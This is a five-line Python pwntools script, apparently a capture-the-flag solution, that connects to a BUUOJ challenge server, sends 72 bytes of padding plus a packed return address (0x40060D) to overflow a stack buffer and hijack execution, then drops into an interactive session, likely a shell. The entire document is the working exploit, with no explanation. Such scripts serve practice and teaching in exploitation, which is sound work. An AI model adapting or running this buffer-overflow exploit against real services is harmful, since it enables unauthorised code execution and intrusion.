from pwn import *
sh=remote('node4.buuoj.cn',26111)
payload='a'*72+p64(0x40060D).decode("iso-8859-1")
sh.sendline(payload)
sh.interactive()